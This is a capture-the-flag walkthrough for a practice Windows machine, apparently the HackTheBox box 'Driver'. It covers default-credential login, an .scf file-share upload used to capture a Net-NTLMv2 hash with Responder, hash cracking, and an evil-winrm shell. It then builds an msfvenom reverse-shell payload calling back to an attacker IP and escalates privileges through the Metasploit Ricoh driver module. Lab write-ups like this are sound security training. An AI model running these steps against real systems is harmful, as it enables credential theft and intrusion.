1,Enumerate (port)
	`nmap -sC -sV -Pn -p- 10.10.11.106`
Firstly check the tcp ports:
80/tcp http  `HTTP/1.1 401 Unauthorized\x0D`
135/tcp RPC
445/tcp SMB
5985/tcp http

In these services, we can check SMB first, because of 
`| smb2-security-mode: 
`|   3:1:1: `
`|_    Message signing enabled but not required`
But it also needs authorization.

So let's try to crack the 80 port with easy passwords
`admin:admin`
It is very luckily that it use the default password.

But there is only one useful web page `fw_up.php`
This web page provides an upload interface and it did not take any limitations.
The page says that what I upload will go to their file share. That implies it’s not going to the webserver necessarily, so looking for a way to upload webshell doesn’t make much sense.

当您拥有文件共享的写权限时，经典攻击是删除引用攻击者控制的主机上的 SMB 共享上的图标文件的 .scf 文件。如果使用文件资源管理器打开包含 .scf 文件的文件夹，.scf 将激励资源管理器重新连接以获取该图标文件，并提供 Net-NTLMv2 身份验证协商。如果我控制该主机，我可以捕获该交换并尝试使用离线暴力破解（如 hashcat）破解 Net-NTLMv2.

The format of .scf file:
	[Shell]
	Command=2
	IconFile=<icon file>
	[<thing you want to control>]
	Command=<command>

When we upload our payload, then we can get NTLMv2 hash in reponder.
	`sudo responder -I tun0`

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:abaaa2af4812d241:90D70F888BBF197212E52B696E47C4EC:0101000000000000007DFAE09CDDDA01E5F23A21207413980000000002000800520042004C00450001001E00570049004E002D004400540037004D003600450049004F0038004800510004003400570049004E002D004400540037004D003600450049004F003800480051002E00520042004C0045002E004C004F00430041004C0003001400520042004C0045002E004C004F00430041004C0005001400520042004C0045002E004C004F00430041004C0007000800007DFAE09CDDDA0106000400020000000800300030000000000000000000000000200000877E6F5553D4F7E574733D614B15298519BA83ABEB6AA5A9BC0BC0CD92DFB13A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0031003300000000000000000000000000

Then we can crack this hash by hashcat or john.
	`hashcat tony.hash -m 5600  /usr/share/wordlists/rockyou.txt`
the result:
	`tony:liltony`

use evil-winrm to get tony shell.
	`evil-winrm -i 10.10.11.106 -u tony -p liltony`
Finally we get user.txt

2, Privilege Escalation
Enumerate the enviroment by using WinPeass
There’s a ton of output. One thing that caught my eye was a PowerShell history file:

	`Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'`

	`ping 1.1.1.1`
	`ping 1.1.1.1`

There he is , attractive version !

Ricoh Driver - Privilege Escalation (Metasploit)
https://www.exploit-db.com/exploits/48036

So let's use the meterpreter!

set our msfvenom payload
	`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.13 LPORT=4444 -f exe -o rev.exe`

upload it and use msfconsole to handler the shell.

use the payload use "exploit/windows/local/ricoh_driver_privesc"

In this place, there would be a rabbit hole.
Firstly, we have use payload windows/local/ricoh_driver_privesc on the before session, if we directly exploit it, the payload would not send or handler.

So we have to migrate the original payload process

	`ps` find a free process
	`migrate -N explorer.exe` migrate it to this free process

Then we can just exploit and get system shell.
